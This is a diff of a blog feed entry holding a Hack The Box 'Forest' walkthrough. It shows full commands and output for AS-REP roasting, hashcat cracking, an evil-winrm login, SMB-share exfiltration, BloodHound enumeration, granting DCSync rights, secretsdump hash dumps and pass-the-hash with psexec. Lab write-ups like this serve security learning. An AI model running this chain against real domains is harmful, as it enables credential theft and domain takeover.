@@ -1343,17 +1343,20 @@ user:<span style="color:#f92672">[</span>santi<span style="color:#f92672">]</spa
 <h2 id="foothold">Foothold</h2>
 <h3 id="shell-as-svc-alfresco">Shell as svc-alfresco</h3>
 <h4 id="asrep-roasting">ASREP Roasting</h4>
-<p>In Active Directory, if there&rsquo;s a user, that by any chance, has its Kerberos pre-authentication disabled, then we can use a tool from Impacket called <code>GetNPUsers.py</code> to obtain the user&rsquo;s <em>ticket-granting-ticket</em> (TGT).</p>
-<p>When using Kerberos as an authentication protocol and the pre-auth is enabled, the client or user must provide a timestamp encrypted with their password hash for each request they send (KRB_AS_REQ). If the server reads a valid time from the request, it returns the user&rsquo;s TGT along with Session Key encrypted with the user&rsquo;s password hash (KRB_AS_REP).</p>
-<p>With preauth disabled, the user doesn&rsquo;t need to provide the timestamp. The server only validates them based on their usernames. Therefore, an attacker can send a replay attack/dummy request to obtain the TGT and brute force it offline (read more about it <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">here</a>)</p>
-<p>Below is the overview of the Kerberos mechanism. The red circle is where the AS-REP roasting attack happened.</p>
+<p>In Active Directory, users with Kerberos pre-authentication disabled are vulnerable to what is known as <strong>AS-REP roasting attack</strong>.</p>
+<p>When Kerberos is used as the authentication protocol and the pre-auth is enabled, the client or user must <strong>include a timestamp</strong> encrypted with their password hash for each request they send (KRB_AS_REQ). If the server reads a valid time** after decrypting the request using the user&rsquo;s password stored in <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM</a>, it gives the user a <em><strong>ticket-granting-ticket</strong></em>  (TGT) along with a session key encrypted with the user&rsquo;s password  as the response (KRB_AS_REP).</p>
+<p>Now, if the preauth is disabled, timestamp is not needed. As a result, an attacker could send a replay attack/dummy request to obtain the TGT and brute force it offline (read more about it <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">here</a>).</p>
+<blockquote>
+<p>**5 minutes is the default tolerance</p>
+</blockquote>
+<p>Below is the overview of the Kerberos mechanism. The AS-REP roasting process is indicated by the red circle (or oval I guess?).</p>
 <center>
 <p><div class="img-container"><img src="imgs/55e839a7e034457a922add499992970d.png" alt="1c8adf13109de9cc575c53d4eb659467.png"  /></div>
 </p>
 <p><small>Taken from &ldquo;Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System&rdquo; by David Freimanis</small></p>
 </center>
-<p><code>GetNPUsers.py</code> initiates a dummy request to Forest DC and successfully captures a TGT belongs to <code>svc-alfresco</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+<p>A tool called <code>GetNPUsers.py</code> can be used to initiate a dummy request for AS-REP roasting. Here, the tool captured  <code>svc-alfresco</code>&rsquo;s TGT.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
 $ GetNPUsers.py -dc-ip <span style="color:#e6db74">&#39;10.10.10.171&#39;</span> -request htb.local/  -usersfile users -format
 Impacket v0.9.20 - Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation
 
@@ -1364,14 +1367,14 @@ svc-alfresco  CN<span style="color:#f92672">=</span>Service Accounts,OU<span sty
 
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7$ea7045cfe9b7583ebd9ba81934cf51330863f66e8b3c2c542981f6317b851980eae4e1a23048e95003cfb38c692075cabf9e3da009e3b1a0e17a34f6fd5d27aa1869a458faee9eff4bdbf5f5f3aaf826caf7e0326f52a522b630becd8f636b8b2fd11af194a18e86d07ad8a55299739684d8be527a9e75e16480db5177841cc7f54ab98891d1691b6ab7f4cbc576d0036820a6c3e59aeaee32e88628c88929e522af9b98ce169ea3bc369551a2925c76bd64e13a7a312119552dad92e9a43814e9033c5ad7d4d4c9808a968ebcc269a52e1f458a4d98c5d930068c52d15c5385c2d71f90933a
 </code></pre></div><h4 id="cracking-tgt">Cracking TGT</h4>
-<p>A Dictionary attack using <code>hashcat</code> successfully cracked the TGT and revealed the password of <code>svc-alfresco</code></p>
-<pre><code>hashcat64.exe -m 18200 svcalfresco.txt rockyou.txt -O
-</code></pre><p><div class="img-container"><img src="imgs/54b3a7dbe1c644a98c00a8458e2723ff.png" alt="3fa7dc6810434503007549f8610016fa.png"  /></div>
+<p>The obtained TGT can be cracked  with dictionary attack using <code>hashcat</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ hashcat64.exe -m <span style="color:#ae81ff">18200</span> svcalfresco.txt rockyou.txt -O
+</code></pre></div><p><div class="img-container"><img src="imgs/54b3a7dbe1c644a98c00a8458e2723ff.png" alt="3fa7dc6810434503007549f8610016fa.png"  /></div>
 </p>
 <p>The password is <code>s3rvice</code>.</p>
 <h4 id="remote-login---evil-winrm">Remote login - Evil-WinRM</h4>
 <p>User <code>svc-alfresco</code> can login remotely via WinRM using <code>evil-winrm</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
 $ evil-winrm -i <span style="color:#e6db74">&#39;10.10.10.161&#39;</span> -u svc-alfresco -p s3rvice
 </code></pre></div><p>User flag is done here.</p>
 <center>
@@ -1381,33 +1384,27 @@ $ evil-winrm -i <span style="color:#e6db74">&#39;10.10.10.161&#39;</span> -u svc
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
 <h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
-<p>After days, I couldn’t find a vulnerable application or services on this machine (this is prior to ZeroLogon), so I’ll use BloodHound to collect more information about object relationships within this Active Directory.</p>
-<p>First, I’ll host my own shares using <code>smbserver.py</code> from Impacket. This will make it easier to exfil and clean up data.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
-$ mkdir shares; cd shares/
-→ root@iamf «shares» «10.10.14.116»
+<p>BloodHound is a great tool to collect more information about object relationships within this Active Directory.</p>
+<p>First, I’ll host my own shares using <code>smbserver.py</code> from Impacket. This will make it easier for data exfiltration and clean up.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «shares» «10.10.14.116»
 $ smbserver.py myfj . -smb2support -username iamf -password iamf
 </code></pre></div><p>On Forest, I’ll use my share as a network drive.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\&gt; $pass = ConvertTo-SecureString <span style="color:#e6db74">&#39;belompi&#39;</span> -AsPlainText -Force
-*Evil-WinRM* PS C:\&gt;
-*Evil-WinRM* PS C:\&gt; $cred = New-Object System.management.automation.pscredential(<span style="color:#e6db74">&#39;mikun&#39;</span>, $pass)
-*Evil-WinRM* PS C:\&gt;
-*Evil-WinRM* PS C:\&gt; New-PSDrive -Name mikun -PSProvider FileSystem -Credential $cred -Root \\<span style="color:#66d9ef">[tun0ip]</span>\myfj
-*Evil-WinRM* PS C:\&gt; 
-*Evil-WinRM* PS C:\&gt; cd mikun<span style="color:#960050;background-color:#1e0010">:</span>
-</code></pre></div><p>I&rsquo;ve already copied <code>SharpHound.exe</code>, the BloodHound ingestor, to my shares.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> $pass <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;belompi&#39;</span> -AsPlainText -Force
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> $cred <span style="color:#f92672">=</span> New-Object System.management.automation.pscredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;mikun&#39;</span>, $pass<span style="color:#f92672">)</span>
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> New-PSDrive -Name mikun -PSProvider FileSystem -Credential $cred -Root <span style="color:#ae81ff">\\</span><span style="color:#f92672">[</span>tun0ip<span style="color:#f92672">]</span><span style="color:#ae81ff">\m</span>yfj
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> cd mikun:
+</code></pre></div><p>I&rsquo;ve already copied <code>SharpHound.exe</code>, the BloodHound ingestor, to my share.</p>
 <center>
 <p><div class="img-container"><img src="imgs/80def241b823454fa383ea4c1caabc48.png" alt="4da2b821c626eeaa85eecea39b4c96d7.png"  /></div>
 </p>
 </center>
-<p>I’ll start collecting with <code>-c all</code> option to collect all.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; .\SharpHound.exe -c all
+<p>I’ll start data collecting with <code>-c all</code> option to collect all.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS mikun:<span style="color:#ae81ff">\&gt;</span> .<span style="color:#ae81ff">\S</span>harpHound.exe -c all
 </code></pre></div><p><div class="img-container"><img src="imgs/acfc9f4b0e234e03824e901be6c9bae0.png" alt="79cb63de9a27f691e28d80820db1ad3d.png"  /></div>
 </p>
-<p>After it finishes, I’ll start the BloodHound GUI and then load the collected data by drag and drop.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+<p>After it finishes, I’ll fire up BloodHound GUI and then load the collected data by drag and drop.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
 $ neo4j console &amp;
-
 → root@iamf «forest» «10.10.14.116»
 $ bloodhound --no-sandbox &amp;
 </code></pre></div><p>I marked <code>svc-alfresco</code> as ‘owned’ then used BloodHound pre-built analytics queries to find the shortest path from <code>svc-alfresco</code> to domain admin. The prebuilt query name is “Shortest Path from Owned Principal”.</p>
@@ -1430,7 +1427,6 @@ $ bloodhound --no-sandbox &amp;
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; Import-Module .\powerview.ps1
 </code></pre></div><p>Then I&rsquo;ll create a new user and join it to the <code>Exchange Windows Permissions</code> group.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; net user mikun password /add /domain
-*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; 
 *Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; net group <span style="color:#e6db74">&#34;Exchange Windows Permission&#34;</span> /add mikun
 </code></pre></div><p>After that, grant it DCSync rights</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; $pass = ConvertTo-SecureString <span style="color:#e6db74">&#39;password&#39;</span> -AsPlainText -Force
@@ -1439,7 +1435,7 @@ $ bloodhound --no-sandbox &amp;
 *Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt;
 *Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; Add-DomainObjectAcl -Credential $cred -TargetIdentity <span style="color:#e6db74">&#34;DC=htb, DC=local&#34;</span> -PrincipalIdentity mikun -Rights DCSync
 </code></pre></div><p>Now I can use <code>secretsdump.py</code> from Impacket with that user to perform a DCSync attack.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
 $ secretsdump.py htb.local/mikun:<span style="color:#e6db74">&#39;password&#39;</span>@10.10.10.161
 Impacket v0.9.20 - Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation
 
@@ -1450,14 +1446,14 @@ htb.local<span style="color:#ae81ff">\A</span>dministrator:500:aad3b435b51404eea
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-.... &lt;snip&gt; ....
+... &lt;SNIP&gt; ...
 htb.local<span style="color:#ae81ff">\s</span>ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
 htb.local<span style="color:#ae81ff">\l</span>ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
 htb.local<span style="color:#ae81ff">\s</span>vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
 htb.local<span style="color:#ae81ff">\a</span>ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
 htb.local<span style="color:#ae81ff">\m</span>ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
 htb.local<span style="color:#ae81ff">\s</span>anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
-.... &lt;snip&gt; ....
+... &lt;SNIP&gt; ...
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
 </code></pre></div><h4 id="pass-the-hash-with-psexecpy">Pass the Hash with psexec.py</h4>
 <p>Administrator hash can be used with <code>psexec.py</code> from Impacket to gain shell access (pass-the-hash).</p>
@@ -1470,6 +1466,7 @@ $ psexec.py -hashes <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51
 <ul>
 <li><a href="https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/">https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/</a></li>
 <li><a href="https://www.diva-portal.org/smash/get/diva2:1358429/FULLTEXT01.pdf">https://www.diva-portal.org/smash/get/diva2:1358429/FULLTEXT01.pdf</a></li>
+<li><a href="https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx">Kerberos Pre-Authentication: Why It Should Not Be Disabled - TechNet Articles - United States (English) - TechNet Wiki</a></li>
 </ul>
 ]]></content:encoded>
     </item>
